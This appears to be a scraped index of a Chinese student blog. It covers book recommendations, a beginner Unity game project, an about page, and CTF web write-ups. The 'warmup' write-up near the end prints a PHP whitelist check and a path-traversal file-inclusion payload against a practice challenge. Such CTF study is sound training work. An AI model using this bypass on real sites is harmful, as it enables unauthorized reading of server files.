海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#推书消遣类"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#总结"},{"categories":["Unity"],"content":" 项目构思与简介套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。 把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（? 因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。 项目说明W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹 游戏实机截图 项目技术路线一个正常的Unity入门项目，运用到了一些Unity的基本知识。 物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。 刚体碰撞的代码的具体实现如下： private void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\"Monster\")) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\"Empty\"); Fa.SendMessage(\"AddScore\", 1); } } 总结总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。 链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq –来自百度网盘超级会员V3的分享 链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra –来自百度网盘超级会员V3的分享 ","date":"2022-01-18","objectID":"/articles/KKLEEEE/:0:0","series":null,"tags":null,"title":"KKLEEEE（Unity入门项目总结）","uri":"/articles/KKLEEEE/#"},{"categories":["Unity"],"content":" 项目构思与简介套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。 把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（? 因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。 项目说明W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹 游戏实机截图 项目技术路线一个正常的Unity入门项目，运用到了一些Unity的基本知识。 物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。 刚体碰撞的代码的具体实现如下： private void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\"Monster\")) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\"Empty\"); Fa.SendMessage(\"AddScore\", 1); } } 总结总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。 链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq –来自百度网盘超级会员V3的分享 链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra –来自百度网盘超级会员V3的分享 ","date":"2022-01-18","objectID":"/articles/KKLEEEE/:0:0","series":null,"tags":null,"title":"KKLEEEE（Unity入门项目总结）","uri":"/articles/KKLEEEE/#项目构思与简介"},{"categories":["Unity"],"content":" 项目构思与简介套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。 把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（? 因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。 项目说明W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹 游戏实机截图 项目技术路线一个正常的Unity入门项目，运用到了一些Unity的基本知识。 物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。 刚体碰撞的代码的具体实现如下： private void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\"Monster\")) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\"Empty\"); Fa.SendMessage(\"AddScore\", 1); } } 总结总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。 链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq –来自百度网盘超级会员V3的分享 链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra –来自百度网盘超级会员V3的分享 ","date":"2022-01-18","objectID":"/articles/KKLEEEE/:0:0","series":null,"tags":null,"title":"KKLEEEE（Unity入门项目总结）","uri":"/articles/KKLEEEE/#项目说明"},{"categories":["Unity"],"content":" 项目构思与简介套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。 把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（? 因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。 项目说明W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹 游戏实机截图 项目技术路线一个正常的Unity入门项目，运用到了一些Unity的基本知识。 物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。 刚体碰撞的代码的具体实现如下： private void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\"Monster\")) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\"Empty\"); Fa.SendMessage(\"AddScore\", 1); } } 总结总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。 链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq –来自百度网盘超级会员V3的分享 链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra –来自百度网盘超级会员V3的分享 ","date":"2022-01-18","objectID":"/articles/KKLEEEE/:0:0","series":null,"tags":null,"title":"KKLEEEE（Unity入门项目总结）","uri":"/articles/KKLEEEE/#游戏实机截图"},{"categories":["Unity"],"content":" 项目构思与简介套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。 把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（? 因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。 项目说明W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹 游戏实机截图 项目技术路线一个正常的Unity入门项目，运用到了一些Unity的基本知识。 物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。 刚体碰撞的代码的具体实现如下： private void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\"Monster\")) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\"Empty\"); Fa.SendMessage(\"AddScore\", 1); } } 总结总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。 链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq –来自百度网盘超级会员V3的分享 链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra –来自百度网盘超级会员V3的分享 ","date":"2022-01-18","objectID":"/articles/KKLEEEE/:0:0","series":null,"tags":null,"title":"KKLEEEE（Unity入门项目总结）","uri":"/articles/KKLEEEE/#项目技术路线"},{"categories":["Unity"],"content":" 项目构思与简介套壳飞机大战加上模拟网络条件不佳的情况下产生的延迟（XDU校园网直呼内行）。 把飞机大战的壳换成了可莉发射蹦蹦炸弹打丘丘人（? 因为担心太简单所以另外开了个极限模式把延迟调到了1000ms，给喜欢操作的人留了很高的操作空间。 项目说明W：向上移动 A：向左移动 S：向下移动 D：向右移动 按下鼠标：丢出炸弹 游戏实机截图 项目技术路线一个正常的Unity入门项目，运用到了一些Unity的基本知识。 物体之间的碰撞需要用到刚体的技术，在此项目中为Rigidbody 2D和Box Collider 2D元件。 刚体碰撞的代码的具体实现如下： private void OnTriggerEnter2D(Collider2D collision) { if (collision.tag.Equals(\"Monster\")) { Destroy(collision.gameObject); Destroy(this.gameObject); GameObject Fa = GameObject.Find(\"Empty\"); Fa.SendMessage(\"AddScore\", 1); } } 总结总而言之是个非常基础的项目，了解了一下Unity2D的基本工作流。 链接：https://pan.baidu.com/s/18Is4HDqZL97i-scP0-b-Xg 提取码：yliq –来自百度网盘超级会员V3的分享 链接：https://pan.baidu.com/s/1GXPYW85KffQoRN20MWjCtg 提取码：xqra –来自百度网盘超级会员V3的分享 ","date":"2022-01-18","objectID":"/articles/KKLEEEE/:0:0","series":null,"tags":null,"title":"KKLEEEE（Unity入门项目总结）","uri":"/articles/KKLEEEE/#总结"},{"categories":null,"content":"翼哥哥 我的老博客 果果 Frank神 qzx神 arcturus神 Dimole神 ","date":"2022-01-18","objectID":"/links/:0:0","series":null,"tags":null,"title":"友链","uri":"/links/#"},{"categories":null,"content":"老家浙江温州乐清市，现在在西安电子科技大学读书。 QQ：2020150384 博客园：https://www.cnblogs.com/zeroy 上面这个博客记录了高中时期的OI代码。 ","date":"2022-01-18","objectID":"/about/:0:0","series":null,"tags":null,"title":"关于我","uri":"/about/#"},{"categories":null,"content":" 个人经历 2019-2021:NOIP2018 一等奖 434 CSP-S 2019 一等奖 457 2021-:iEEE Xtreme 2021 第32名 CSP-24th 289 西安电子科技大学程序设计新生赛2021 特等奖 第三名 中国高校计算机大赛 团体程序设计天梯赛 个人三等奖 miniL CTF团队赛 第五名 西安电子科技大学程序设计校赛2022 一等奖 第九届ACM/ICPC陕西省赛 铜 ","date":"2022-01-18","objectID":"/about/:0:1","series":null,"tags":null,"title":"关于我","uri":"/about/#个人经历"},{"categories":null,"content":" 个人经历 2019-2021:NOIP2018 一等奖 434 CSP-S 2019 一等奖 457 2021-:iEEE Xtreme 2021 第32名 CSP-24th 289 西安电子科技大学程序设计新生赛2021 特等奖 第三名 中国高校计算机大赛 团体程序设计天梯赛 个人三等奖 miniL CTF团队赛 第五名 西安电子科技大学程序设计校赛2022 一等奖 第九届ACM/ICPC陕西省赛 铜 ","date":"2022-01-18","objectID":"/about/:0:1","series":null,"tags":null,"title":"关于我","uri":"/about/#2019-2021"},{"categories":null,"content":" 个人经历 2019-2021:NOIP2018 一等奖 434 CSP-S 2019 一等奖 457 2021-:iEEE Xtreme 2021 第32名 CSP-24th 289 西安电子科技大学程序设计新生赛2021 特等奖 第三名 中国高校计算机大赛 团体程序设计天梯赛 个人三等奖 miniL CTF团队赛 第五名 西安电子科技大学程序设计校赛2022 一等奖 第九届ACM/ICPC陕西省赛 铜 ","date":"2022-01-18","objectID":"/about/:0:1","series":null,"tags":null,"title":"关于我","uri":"/about/#2021-"},{"categories":["CTF-WEB"],"content":" baby_web进去之后发现是/1.php,根据提示“初始页面”，用burpsuite截获index.php，获得flag。 知识点：网页初始页面的文件名一般为index。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:1","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#baby_web"},{"categories":["CTF-WEB"],"content":" warmup进去之后发现一个滑稽表情，用burpsuite截获数据包后发现有个source.php，打开之后发现页面源代码。 \u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) {//page必须被设置且page必须是字符串，否则将被过滤 echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) {//如果page在白名单内则合法 return true; } $_page = mb_substr(//mb_substr(str,start,length)截取字符串中的一段 $page, 0, mb_strpos($page . '?', '?')//查找'?'在page中首次出现的位置 );//将page问号之后的内容截掉 if (in_array($_page, $whitelist)) {//若此时的page在白名单内则合法 return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file'])//_REQUEST是post和get的集合 \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file'])//要求file也满足上面的要求 ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /\u003e\"; } 根据源代码得到提示，找到文件hint.php，得知flag在ffffllllaaaagggg这个文件里。再次进行代码审计,发现底下有个文件包包含，构造payload为： http://111.200.241.244:60683/source.php?file=source.php?./../../../../ffffllllaaaagggg 就可以得到flag。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:2","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#warmup"},{"categories":["CTF-WEB"],"content":" Training-WWW-Robots签到题，科普了一波robots.txt。 ","date":"2022-01-18","objectID":"/articles/XCTF-WEB-1/:0:3","series":null,"tags":null,"title":"攻防世界web前11题WP","uri":"/articles/XCTF-WEB-1/#training-www-robots"},{"categories":["CTF-WEB"],"content":" PHP2根据题目提示访问/index.phps获取提示信息： \u003c?php if(\"admin\"===$_GET[id]) {//如果id全等于admin则会被过滤 echo(\"\u003cp\u003enot allowed!\u003c/p\u003e\"); exit(); } $_GET[id] = urldecode($_GET[id]);//id进行一次url解码 if($_GET[id] == \"admin\") { echo \"\u003cp\u003eAccess granted!\u003c/p\u003e\"; echo \"\u003cp\u003eKey: 